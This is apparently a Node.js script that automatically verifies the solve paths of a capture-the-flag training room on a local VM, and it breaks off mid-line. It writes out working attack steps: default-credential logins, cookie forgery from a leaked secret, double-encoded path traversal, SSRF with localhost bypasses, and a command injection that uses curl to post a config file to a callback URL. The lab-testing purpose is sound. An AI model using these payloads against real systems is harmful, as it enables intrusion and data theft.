// End-to-end check that every task is solvable through its INTENDED path, starting only
// from what a player can see. Run on your PC against the built VM (VirtualBox NAT
// port-forwards on 127.0.0.1), with the private answers file for comparison:
//   node deploy/tryhackme/verify-solves.mjs deploy/tryhackme/room/ANSWERS.private.md
// Prints PASS/FAIL per task. Never prints a flag.
import fs from "node:fs";
import crypto from "node:crypto";

const H = process.env.VM_HOST || "127.0.0.1";
const CONSOLE = `http://${H}:${process.env.CONSOLE_PORT || 8080}`;
const url = (port, p = "") => `http://${H}:${port}${p}`;
const answers = Object.fromEntries(
  [...fs.readFileSync(process.argv[2], "utf8").matchAll(/^- Task (\d+) \([^)]*\): (.+)$/gm)].map((m) => [m[1], m[2].trim()]),
);
const FLAG_RE = /ROOT\{[^}\s"<]+\}/;
const results = [];
const report = (id, ok, note = "") => { results.push(ok); console.log(`${ok ? "PASS" : "FAIL"} task ${String(id).padStart(2)} ${note}`); };
const same = (id, found) => !!found && found === answers[id];
const get = async (u, opt = {}) => { const r = await fetch(u, { redirect: "manual", ...opt }); return { r, text: await r.text() }; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function step(id, fn) {
  try { await fn(); } catch (e) { report(id, false, `(error: ${e.message.slice(0, 120)})`); }
}

// Console login (gives collaborator links for 12/13)
let consoleCookie = "", collab = null;
await step(0, async () => {
  const r = await fetch(`${CONSOLE}/api/auth/login`, {
    method: "POST", headers: { "Content-Type": "application/json", Origin: CONSOLE },
    body: JSON.stringify({ leader_email: "operator@veyra.thm", password: "HeistOperator2026" }),
  });
  consoleCookie = (r.headers.get("set-cookie") || "").split(";")[0];
  const d = await (await fetch(`${CONSOLE}/api/dashboard?fresh=true`, { headers: { Cookie: consoleCookie } })).json();
  const c12 = d.challenges.find((c) => c.id === 12);
  collab = c12?.collabInfo;
  const open = d.challenges.every((c) => !c.locked);
  console.log(`${r.ok && collab && open ? "PASS" : "FAIL"} console login, all tasks open, callback issued`);
});

// 1 robots.txt -> hidden dir
await step(1, async () => {
  const robots = (await get(url(3101, "/robots.txt"))).text;
  const dir = robots.match(/Disallow:\s*(\S+)/)[1];
  const page = (await get(url(3101, dir))).text;
  report(1, same(1, page.match(FLAG_RE)?.[0]), `via robots.txt -> ${dir}`);
  const pass = page.includes("veyrasecure2026");
  console.log(`${pass ? "PASS" : "FAIL"} task  6 passphrase is discoverable on the task 1 staging page`);
});

// 2 RSA: confirm the published key/ciphertext match the answer (encrypt answer, compare)
await step(2, async () => {
  const pk = (await get(`${CONSOLE}/artifacts/ch02/public_key.txt`)).text;
  const ct = (await get(`${CONSOLE}/artifacts/ch02/ciphertext.txt`)).text;
  const n = BigInt(pk.match(/Modulus \(n\):\s*(\d+)/)[1]), e = BigInt(pk.match(/Exponent \(e\):\s*(\d+)/)[1]);
  const c = BigInt(ct.match(/(\d{20,})/)[1]);
  let m = BigInt("0x" + Buffer.from(answers[2]).toString("hex")), r = 1n, b = m % n, x = e;
  while (x > 0n) { if (x & 1n) r = (r * b) % n; b = (b * b) % n; x >>= 1n; }
  report(2, r === c, "(downloads served; ciphertext = answer under the published key)");
});

// 3 profile alt text
await step(3, async () => {
  const page = (await get(url(3103, "/"))).text;
  report(3, same(3, page.match(FLAG_RE)?.[0]), "via profile image alt text");
});

// 4 /portal + default creds
await step(4, async () => {
  const login = await fetch(url(3104, "/portal/login"), {
    method: "POST", redirect: "manual", headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "username=admin&password=admin123",
  });
  const cookie = (login.headers.get("set-cookie") || "").split(";")[0];
  const dash = (await get(url(3104, "/portal/dashboard"), { headers: { Cookie: cookie } })).text;
  report(4, same(4, dash.match(FLAG_RE)?.[0]), "via /portal default credentials");
});

// 5 broken quote -> MD5 of the answer's inner value
await step(5, async () => {
  const j = JSON.parse((await get(url(3105, '/search?q=Ethan%22'))).text);
  const hash = j.results?.[0]?.notes?.match(/\b[a-f0-9]{32}\b/)?.[0];
  const inner = answers[5].replace(/^ROOT\{|\}$/g, "");
  report(5, !!hash && crypto.createHash("md5").update(inner).digest("hex") === hash, "(leaked hash = MD5 of answer)");
});

// 6 image is downloadable (steghide extraction itself is checked on the VM by build-vm.sh)
await step(6, async () => {
  const r = await fetch(`${CONSOLE}/artifacts/ch06/leaked_office.jpg`);
  const buf = Buffer.from(await r.arrayBuffer());
  report(6, r.ok && buf[0] === 0xff && buf[1] === 0xd8, "(image served; stego extraction verified during VM build)");
});

// 7 + 8 shared portal
await step(7, async () => {
  const login = await fetch(url(3107, "/api/auth/login"), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "priya.nair", password: "Veyra#Audit26" }),
  });
  const sc = login.headers.get("set-cookie") || "";
  if (/;\s*secure/i.test(sc)) console.log("FAIL task  7 portal cookie is Secure-only: browsers will not log in over HTTP");
  const cookie = sc.split(";")[0], H7 = { headers: { Cookie: cookie } };
  const mine = JSON.parse((await get(url(3107, "/api/my-invoices"), H7)).text);
  const memos = JSON.parse((await get(url(3107, "/api/audit/memos"), H7)).text);
  const cust = Number(JSON.stringify(memos).match(/Customer ID (\d+)/)[1]);
  const inv = mine.invoices[0];
  const key = (mine.account.customerId * 1000 + inv.invoice_num) ^ parseInt(inv.invoice_id.slice(4), 16);
  const target = "INV-" + ((cust * 1000 + 1) ^ key).toString(16).toUpperCase().padStart(6, "0");
  const res = JSON.parse((await get(url(3107, `/api/invoices/${target}`), H7)).text);
  report(7, same(7, JSON.stringify(res).match(FLAG_RE)?.[0]), `via derived key -> ${target}`);

  const bundle = (await get(`${CONSOLE}/artifacts/ch08/bundle.min.js`)).text;
  const routes = [...new Set(bundle.match(/\/api\/[a-z0-9/_-]+/g) || [])];
  let f8 = null;
  for (const rt of routes) {
    const t = (await get(url(3107, rt), H7)).text;
    const m = t.match(FLAG_RE)?.[0];
    if (m) { f8 = m; break; }
  }
  report(8, same(8, f8), `(found by trying the ${routes.length} routes listed in the bundle)`);
});

// 9 debug source -> forge admin cookie
await step(9, async () => {
  const home = (await get(url(3109, "/"))).text;
  const src = (await get(url(3109, home.match(/\/debug\/[a-z.]+/)[0]))).text;
  const secret = src.match(/SESSION_SECRET = "([^"]+)"/)[1];
  let acc = 0x5a17; const input = `admin::${secret}`;
  for (let i = 0; i < input.length; i++) acc = ((acc << 5) - acc + input.charCodeAt(i) * (i + 1)) & 0xffffffff;
  const cookie = Buffer.from(`role=admin.${(acc >>> 0).toString(16).padStart(8, "0")}`).toString("base64");
  const page = (await get(url(3109, "/dashboard"), { headers: { Cookie: `auth_session=${cookie}` } })).text;
  report(9, same(9, page.match(FLAG_RE)?.[0]), "via HTML comment -> /debug/session.js -> forged cookie");
});

// 10 listing -> config clue -> double-encoded traversal
await step(10, async () => {
  const list = JSON.parse((await get(url(3110, "/api/files"))).text);
  const cfgName = list.availableBackups.find((f) => f.filename.endsWith(".json")).filename;
  const cfg = JSON.parse((await get(url(3110, `/api/download?file=${cfgName}`))).text);
  const rel = cfg.vault_recovery_archive.match(/\.\.\/\S+/)[0];
  const blocked = (await get(url(3110, `/api/download?file=${rel}`))).r.status === 404;
  const enc = rel.replace(/\.\.\//g, "%252e%252e%252f");
  const vault = (await get(url(3110, `/api/download?file=${enc}`))).text;
  report(10, blocked && same(10, vault.match(FLAG_RE)?.[0]), `via ${cfgName} clue, naive blocked, double-encoded works`);
});

// 11 correlate logs -> exact path from the log
await step(11, async () => {
  const g = (await get(`${CONSOLE}/artifacts/ch11/gateway-7.log`)).text;
  const p = g.match(/export_manifest=(\S+)/)[1];
  const f = (await get(`${CONSOLE}${p}`)).text;
  report(11, same(11, f.match(FLAG_RE)?.[0]), `via path written in the log (${p})`);
});

const collabLog = async () => {
  const u = collab.logUrl.replace(/^http:\/\/[^/]+/, `http://${H}:8182`);
  return JSON.stringify(await (await fetch(u)).json());
};

// 12 blind injection -> exfil to own callback
await step(12, async () => {
  const page = (await get(url(3112, "/"))).text;
  const api = page.match(/POST (\/api\/[a-z/]+)/)[1];
  const cb = collab.callbackUrl;
  await fetch(url(3112, api), {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ target: `127.0.0.1; curl -s -X POST --data-binary @/app/data/diagnostics.conf ${cb}/t12` }),
  });
  let found = null;
  for (let i = 0; i < 10 && !found; i++) { await sleep(1500); found = (await collabLog()).match(FLAG_RE)?.[0] || null; }
  report(12, same(12, found), `via landing page API ${api} + callback log`);
});

// 13 landing -> robots -> redirect -> internal chain
await step(13, async () => {
  const page = (await get(url(3113, "/"))).text;
  const via = page.match(/http:\/\/localhost:(\d+)\/redirect\?target=/);
  const robots = (await get(url(3113, "/robots.txt"))).text;
  const meta = robots.match(/\/internal\/[a-z0-9-]+/)[0];
  const base = `http://localhost:${via[1]}`;
  const prev = async (target) => JSON.parse((await get(url(3113, `/preview?url=${encodeURIComponent(`${base}/redirect?target=${encodeURIComponent(target)}`)}`))).text);
  const direct = (await get(url(3113, `/preview?url=${encodeURIComponent(`http://127.0.0.1:${via[1]}${meta}`)}`))).r.status;
  const ipv6 = (await get(url(3113, `/preview?url=${encodeURIComponent(`http://[::ffff:127.0.0.1]:${via[1]}${meta}`)}`))).r.status;
  const s2 = await prev(`http://127.0.0.1:${via[1]}${meta}`);
  const relay = s2.preview.registered_services[0].path;
  await prev(`http://127.0.0.1:${via[1]}${relay}/dispatch-code?callback_url=${encodeURIComponent(collab.callbackUrl + "/t13")}`);
  let code = null;
  for (let i = 0; i < 10 && !code; i++) { await sleep(1500); code = (await collabLog()).match(/SEC-[0-9.a-f]+/g)?.pop() || null; }
  const s4 = await prev(`http://127.0.0.1:${via[1]}${relay}/verify?code=${code}`);
  const s5 = await prev(`http://127.0.0.1:${via[1]}${s4.preview.vault_endpoint}?key=${s4.preview.access_key}`);
  report(13, direct === 403 && ipv6 === 403 && same(13, JSON.